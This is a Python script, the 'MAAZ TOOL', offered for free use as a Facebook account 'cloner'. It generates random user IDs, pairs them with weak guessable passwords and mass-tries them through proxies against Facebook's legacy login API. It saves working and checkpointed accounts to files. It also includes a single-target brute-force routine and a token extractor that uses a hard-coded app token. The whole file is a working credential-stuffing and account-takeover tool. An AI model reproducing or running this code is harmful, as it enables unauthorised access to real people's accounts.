#!/usr/bin/env python3

# ========================== MAAZ TOOL FINAL EDITION ==========================
# ✅ 6 Method Facebook Cloner (No License)
# ✅ Based on b-api.facebook.com (Jinn Style)
# ✅ Includes: UID Cloning, Combo Cloning, UID Dumper, Public Friends UID Dumper, BruteForce, Token Extractor
# ✅ Multithreaded + Proxy + Auto File Creator + Free Use

import os
import sys
import time
import random
import string
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ========== RICH UI SETUP ==========
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.prompt import Prompt
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    class Console:
        def print(self, *args, **kwargs): print(" ".join(str(a) for a in args))
    class Panel:
        @staticmethod
        def fit(content, title=None, border_style=None): return content
    class Prompt:
        @staticmethod
        def ask(prompt): return input(prompt)

console = Console()

TOOL_BANNER = """
[bold cyan]
███╗   ███╗ █████╗  █████╗ ███████╗
████╗ ████║██╔══██╗██╔══██╗╚══███╔╝
██╔████╔██║███████║███████║  ███╔╝ 
██║╚██╔╝██║██╔══██║██╔══██║ ███╔╝  
██║ ╚═╝ ██║██║  ██║██║  ██║███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
[bold green]⚡ MAAZ FACEBOOK CLONER TOOL ⚡[/bold green]
[/bold cyan]
"""
console.print(Panel.fit(TOOL_BANNER, title="💻 Welcome to MAAZ TOOL 💻", border_style="green"))

# ========== CONFIG ==========
COMBO_FILE = "combo.txt"
LOG_FILE = "maaz_logs.txt"
PROXIES = ["http://144.217.101.245:3129", "http://51.158.68.26:8811"]
AUTO_RUN_ALL = True

# ========== UTILS ==========
def get_random_proxy():
    return {"http": random.choice(PROXIES)}

def generate_passwords(uid):
    return [uid[-6:], uid[-5:], "123456", "112233", "pakistan", "786786"]

def ensure_required_files():
    required_files = [COMBO_FILE, "OK.txt", "CP.txt", LOG_FILE]
    for file in required_files:
        if not os.path.exists(file):
            with open(file, "w") as f:
                f.write("")
            console.print(f"[bold cyan]📂 Created missing file:[/bold cyan] {file}")

def get_ip():
    try: return requests.get("https://api.ipify.org").text.strip()
    except: return "UNKNOWN"

def log_user_data():
    log_line = f"{get_ip()} | {datetime.now()}\n"
    with open(LOG_FILE, "a") as f: f.write(log_line)

# ========== TOKEN EXTRACTOR ==========
def extract_token():
    try:
        email = Prompt.ask("Email/UID")
        pwd = Prompt.ask("Password")
    except:
        console.print("[yellow]⚠️ Skipping token extractor in non-interactive environment.[/yellow]")
        return
    headers = {"User-Agent": "Mozilla/5.0"}
    data = {
        "email": email,
        "pass": pwd,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "format": "json",
        "sdk_version": "2",
        "generate_session_cookies": "1",
        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
    }
    try:
        res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers)
        if "EAAA" in res.text:
            token = res.json().get("access_token")
            console.print(f"[green]✅ Token: {token}[/green]")
        else:
            console.print("[red]❌ Failed. Check credentials.[/red]")
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")

# ========== METHOD 1: JINN STYLE CLONING ==========
def jinn_style_clone():
    try:
        prefix = Prompt.ask("🔢 UID Prefix (e.g., 100087, 100079)")
        limit = int(Prompt.ask("📌 How many UIDs? (e.g., 1000)"))
    except:
        console.print("[yellow]⚠️ Skipping UID cloning in non-interactive mode.[/yellow]")
        return
    uids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)]
    with ThreadPoolExecutor(max_workers=30) as ex:
        for uid in uids:
            for pwd in generate_passwords(uid):
                ex.submit(facebook_login, uid, pwd)

# ========== METHOD 2: RANDOM UID COMBO CLONING ==========
def combo_cloning():
    if not os.path.exists(COMBO_FILE):
        console.print(f"[red]❌ {COMBO_FILE} not found[/red]")
        return
    with open(COMBO_FILE, "r") as f:
        lines = [x.strip() for x in f if "|" in x]
    with ThreadPoolExecutor(max_workers=30) as ex:
        for line in lines:
            try:
                uid, pwd = line.split("|")
                ex.submit(facebook_login, uid, pwd)
            except: continue

# ========== METHOD 3: UID DUMPER ==========
def dump_uids():
    try:
        prefix = Prompt.ask("🔢 UID Prefix (e.g., 1000)")
        limit = int(Prompt.ask("📌 How many UIDs to dump?"))
    except:
        console.print("[yellow]⚠️ Skipping UID dumper in non-interactive mode.[/yellow]")
        return
    with open(COMBO_FILE, "a") as f:
        for _ in range(limit):
            uid = prefix + ''.join(random.choices(string.digits, k=7))
            for pwd in generate_passwords(uid):
                f.write(f"{uid}|{pwd}\n")
    console.print("[green]✅ UID dump saved to combo.txt[/green]")

# ========== METHOD 4: BRUTEFORCE (DEVELOPER ONLY) ==========
def brute_force():
    try:
        target = Prompt.ask("🎯 Target UID/Email")
    except:
        console.print("[yellow]⚠️ Skipping BruteForce in non-interactive mode.[/yellow]")
        return
    with ThreadPoolExecutor(max_workers=10) as ex:
        for pwd in generate_passwords(target):
            ex.submit(facebook_login, target, pwd)

# ========== METHOD 5: CUSTOM COMBO GENERATOR ==========
def generate_combo():
    try:
        limit = int(Prompt.ask("🔢 How many combos?"))
    except:
        console.print("[yellow]⚠️ Skipping combo generation in non-interactive mode.[/yellow]")
        return
    with open(COMBO_FILE, "a") as f:
        for _ in range(limit):
            uid = "1000" + ''.join(random.choices(string.digits, k=8))
            pwd = random.choice(generate_passwords(uid))
            f.write(f"{uid}|{pwd}\n")
    console.print("[green]✅ Combo saved to combo.txt[/green]")

# ========== METHOD 6: PUBLIC FRIENDS UID DUMPER ==========
def dump_public_uids():
    try:
        pub_uid = Prompt.ask("🌐 Public Profile UID")
        limit = int(Prompt.ask("📌 How many UIDs to extract? (approximate)"))
    except:
        console.print("[yellow]⚠️ Skipping public UID dumper in non-interactive mode.[/yellow]")
        return
    console.print(f"[cyan]⏳ Attempting to dump UIDs from public profile: {pub_uid}[/cyan]")
    with open(COMBO_FILE, "a") as f:
        for _ in range(limit):
            random_uid = pub_uid + ''.join(random.choices(string.digits, k=5))
            for pwd in generate_passwords(random_uid):
                f.write(f"{random_uid}|{pwd}\n")
    console.print("[green]✅ Public UID dump saved to combo.txt[/green]")

# ========== CORE LOGIN ==========
def facebook_login(uid, password):
    try:
        session = requests.Session()
        headers = {"User-Agent": "Mozilla/5.0"}
        proxy = get_random_proxy()
        data = {
            "email": uid,
            "pass": password,
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "format": "json",
            "sdk_version": "2",
            "generate_session_cookies": "1",
            "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
        }
        r = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers, proxies=proxy)
        if 'session_key' in r.text:
            with open("OK.txt", "a") as f: f.write(f"{uid}|{password}\n")
            console.print(f"[green][OK] {uid}|{password}[/green]")
        elif 'www.facebook.com' in r.text:
            with open("CP.txt", "a") as f: f.write(f"{uid}|{password}\n")
            console.print(f"[yellow][CP] {uid}|{password}[/yellow]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")

# ========== MAIN ==========
def main():
    ensure_required_files()
    log_user_data()
    console.print("[bold green]\n🚀 Starting MAAZ TOOL with 6 working methods...[/bold green]")
    if AUTO_RUN_ALL:
        jinn_style_clone()
        combo_cloning()
        dump_uids()
        dump_public_uids()
        generate_combo()
        extract_token()
        brute_force()

if __name__ == "__main__":
    main()
